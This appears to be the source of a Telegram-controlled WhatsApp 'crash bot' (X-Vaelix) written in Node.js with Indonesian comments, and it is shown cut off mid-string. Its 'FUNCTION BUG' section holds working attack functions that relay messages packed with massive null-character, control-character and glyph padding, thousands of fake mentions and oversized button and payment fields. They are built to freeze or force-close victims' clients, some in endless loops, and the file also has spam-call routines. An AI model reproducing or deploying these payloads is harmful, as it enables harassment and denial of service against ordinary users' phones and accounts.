const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@bellaxchuu/xbailey');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const https = require("https")
const sharp = require("sharp");
const { v4, uuidv4 } = require("uuid")
const { pipeline } = require("stream")
const { promisify } = require("util")
const streamPipeline = promisify(pipeline)
const { OpenAI } = require("openai");
const { GoogleGenAI } = require("@google/genai");
const vm = require('vm');
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` X-Vaelix CRASH IS BACK ⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
████████████████████████████████████████████
██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒██
██▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒██
██▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒██
██▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒██
██▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░██
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░██
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░██
██▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░██
██▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░██
██▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░██
██▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░██
██▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░██
██▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░██
██▒░░░░░░░░████████████████████████░░░░░░░░░░██
██▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░██
██▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒██
██▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒██
██▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒██
██▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒██
██▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒██
██▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒██
██████████████████████████████████████████████

`));


console.log(chalk.greenBright(`
[!]X-Vaelix IS ONLINE
`));

console.log(chalk.blueBright(`
[!]X-Vaelix IS ONLINE
`
));
};

startBot();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363425270610135@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363425270610135@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`js◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

// Memory Panel
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/cedglx.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://files.catbox.moe/cedglx.jpg";
const ownerUrl = "https://files.catbox.moe/cedglx.jpg";
const bugUrl = "https://files.catbox.moe/cedglx.jpg";

const menuEffects = [
  "5226928895189598791",
  "5256047523620995497",
  "5389038097860144794",
  "5325707675504222689"
];

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /cd 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\
async function VarlineFrezee(sock, target) {
  await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?...",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_...",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1990 }, () =>
                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
      messageId: null,
      participant: { jid: target },
    }
  );
} 

async function DelayPerma(sock, target) {
  const msg = {
    storageMessage: {
      fileSize: 99999999,
      writeDelay: 300000,  
      readDelay: 300000,   
      cacheDelay: 300000,  
      contextInfo: {
        participant: target,
        quotedMessage: {
          storageMessage: {
            writeDelay: 250000,
            contextInfo: {
              quotedMessage: {
                storageMessage: {
                  readDelay: 200000,
                  contextInfo: {
                    quotedMessage: {
                      storageMessage: {
                        cacheDelay: 150000
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });
}

async function VnXdelayInvisibleNews(sock, target) {

const nameVnX = ["address_message", "galaxy_message",
"call_permission_request"];

let vnxdelayinv = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "BAWZHH KING BUGSS ATTACK YOU BABYY",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxdelayinv, { 
     participant: { jid: target } 
   });
}

async function TryBrok(sock, target) {
  const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];
   
const msg = {
  interactiveMessage: {
  header: {
    title: "ampas bet lu hama",
    hasMediaAttachment: false
  },
  body: {
    text: "\x10".repeat(999999),
  description: "\0".repeat(999999),
    text: "\0"
  },
  nativeFlowMessage: {
    buttons: "\0".repeat(99999),
  paramsJson: "\u0000".repeat(99999) + "\x10".repeat(99999),
    version: 3,
    }
  }
}

await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target }
    });
}

async function DelayNew(target, sock) {
  var msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "FaiqOffcIsHere",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx","landmark_area":"Faiq","address":"Faiq","tower_number":"Faiq","city":"Japanese","name":"Faiq","phone_number":"555555","house_number":"xxx","floor_number":"xxx","state":"Faiq | ${"\0".repeat(900000)}"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function CrashOverlow(sock, target) {
  const MSG = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: " !¡ XakaEmperoryy ",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => "documentMessage"),
            name: "single_select",
            paramsJson: JSON.stringify({
              data: Array.from({ length: 850000 }, () => [])
            }),
          },
        }
      }
    }
  };
  const xaka = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              jpegThumbnail: null,
              caption: "../ This is Xaka 🕊",
              scansSideCar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999,
                9999999999999,
                9999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            },
          },
          body: {
            text: "\u0000".repeat(80000) + "ꦾ".repeat(50000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "call_permission_request",
                buttonsParamsJson: "\u200B",
              },
              {
                name: "payment_method",
                buttonsParamsJson: "\u0000",
              },
              {
                name: "payment_info",
                buttonsParamsJson: "\u0000",
              },
              {
                name: "galaxy_message",
                buttonsParamsJson: "\u0000",
              },
              {
                name: "wa_payment_transaction_details",
                buttonsParamsJson: JSON.stringify({}),
              }
            ]
          }
        }
      }
    }
  };
  await sock.relayMessage(target, MSG, {});
  await sock.relayMessage(target, xaka, {});
}

async function DelayOneHitPermaByMia(sock, target) {
    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                    groupStatusMessageV2: {
                        message: {  
                            interactiveResponseMessage: {
                                body: {
                                    text: "Miaa",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    }
                },
                { userJid: sock.user.id } 
            );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`😚 Quenn Mia Sending Bugs To ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}



async function groupBan1(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
        await sock.groupParticipantsUpdate(target, [fake], action);
        return true;
    } catch (e) {
        console.log(`❌ Gagal: ${e.message}`);
        return false;
    }
}

async function VnXNewBlankPyment(sock, target) {
  const vnxblank = {
    interactiveMessage: {
      body: { text: "VnX" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                payment_settings: [{
                  type: "pix_static_code",
                  pix_static_code: {
                    merchant_name: "ោ៝".repeat(121500),
                    key: "ꦾ".repeat(80000),
                    key_type: "VnX"
                  }
                }]
              })
            }
          ]
        }
      }
    };


  await sock.relayMessage(target, vnxblank, {
    participant: { jid: target },
  });
    
  const vnxtter = {
     newsletterAdminInviteMessage: {
        newsletterJid: "120363321780343299@newsletter",
        newsletterName: "VnX Is Here" + "ꦽꦾ".repeat(250000),
        caption: "VnX" + "ꦽꦾ".repeat(250000),
        inviteExpiration: "9282682616283736",    
       }
    };
         
   await sock.relayMessage(target, vnxtter, {
    participant: { jid: target },
  });
    
    const vnxinvt = {
     groupInviteMessage: {
       groupJid: "1@g.us",
       inviteCode: "ꦽ".repeat(5000),
       inviteExpiration: "99999999999",
       groupName: "༑ ▾ VnX Is Here ▾ ༑" + "ꦾ".repeat(25000),
       caption: " x " + "ꦾ".repeat(5000),
       body: { text: "\n" + "ោ៝".repeat(25000) },
     }
    };
    
    await sock.relayMessage(target, vnxinvt, {
     participant: { jid: target },
  });
}

async function RanModzzForclose(sock, target) {
  const IMG = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "mIl61rSmQ4E4z82XpSvhmpSOT8ByiqgLVwrPk4zC4+4=",
    fileLength: "9999999999",
    height: 9999,
    width: 9999,
    mediaKey: "q3wk/KIXEaRS4QD7VG+n5jWvnbdMcO/xjhZ7h4SCBmI=",
    fileEncSha256: "iG6x4KtQSfdcjLNipUagllg3k8Yj3ANspD+9bWstHB0=",
    directPath: "/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1788599798",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkJCQkKCQoLCwoODw0PDhUTERETFR8WGBYYFh8wHiMeHiMeMCozKScpMypMOzU1O0xXSUVJV2pfX2qFf4WuruoBCQkJCQoJCgsLCg4PDQ8OFRMRERMVHxYYFhgWHzAeIx4eIx4wKjMpJykzKkw7NTU7TFdJRUlXal9faoV/ha6u6v/CABEIAJ0AnQMBIgACEQEDEQH/xAAzAAACAwEBAQEAAAAAAAAAAAAEBQIDBgcBAAgBAAMBAQEAAAAAAAAAAAAAAAIDBAEABf/aAAwDAQACEAMQAAAA4+FF1SaT4wRQeeTlnVfesy1Y1i9ubkYtSVAmbEBaQlNX0wWV+3b1U4+d3k56LMy95drOWGMBz2fhylpFs/d37FeAXb/FdxVaJpAoBbvvaW8+MGh4UJI8vO11BSawx9iJpPXbjTvUSsDdLrwyfukRZ2/Vpi7nCQEWJGexwp8gGIXyMAGjrMwkKpNVo4z0hOFpZ2VYs6wzeFdYlzupiYeRCiyZL4pIw6XjO48rAI2jpA53nX6m5aXcoRHjNNpGOhpOEEGnHEfZeXLZU9a4oZpg7Gs0Gr9ClvlDxqqtcxEyvh+ZmLau1MZuvzb3bjNhJo6ZGkQ2CvQDu9xr7D2PYQAghRB2eImXpUmtzljfDs+/HugKUFpDv87gAk8/EUs6maDDXUxIK1uBZ4ZFqy922yotmTfWJeOBGX6+x2PW6hKoa7qYTKMLWfZrlDYRSxb9KuNIhVfy+ZxXRpMiDtYbKoWwUvxipPaVdM2qQTeyt7RXt6Sl79IuIlQ2CW/APzZOTmRtGvLmBaM71KCllVsaqZ+lq5a4V3AJ8w6vQbYHMWJVhg1g7MC6tY+2xp0iK6/syy0WZ4ZT8M877wfpRLpq+zCS1ltJEiGAbxbXP+Si4Vx97v/EAD8QAAIBAwMCBAIIAgkDBQAAAAECAwAEEQUSITFBBhNRYSLBFCMyQlKBkfBicQcQICQzQ6Gx4TNDkhc0k9Hx/9oACAEBAAE/AFW0SzikeNnkd3HD4A24p2jJGyPaPnn+oUf7Ol6c2oTSxBtuyCST5lR8I/U4FEf1QRGWQLhsDliq7iAOpxV0Y0trOEQNFA5aTzH+NmDHbkDjA+Grm4WXZHHGEiQYUd/mTUZRDlhmpJWc+i+lYNAqCMpxU6orgJ0KKfXqAa5wPSvrviPOmaeSsRjY+TjePU47j1FXN19IESm3hjKDGUXaW+dEYrtTxMqxsSuHBIwQTwccjt/Vb6Rf3EYlSAiI9JHIjT/ybAptNdYIZ94MbTGKQjnY4P8AqORXh7y7eeUNK6Sq34VycICf51d28TzXT25zCs2E46hjwK+oLx7h7aLa88ar5qblBVj+EZPJHeptM1LTLaZJ4mt3fgqysGkQ9vlV4jSTSJJP5kiRLg84GxQNgz2UVjgnP9QYggijLMxDD9MCmMrkbgSTwOKcMrEMMEUT8IFPHg/CHI2gnK4oU8RIBHTFbixJJyTUdllBLK4jT1PU+wHekls7aFZIrKRmJIEsnKk+3YUdVv7him4kONpUDO4fzNWkhh+mQMzIrqCMjdyCCMj9Kie1jlNyGmkllxvGM7ePbk1GbazdBBO+FkMnIBIbHwqPfPeoZbuBjd/3hYnfJdOhANXHi+/mQQLjyAACsgV2atOg0y+vImX+7PvXchy0bc8+pFalp09ncPHIhGP5j2PcVsO0t74r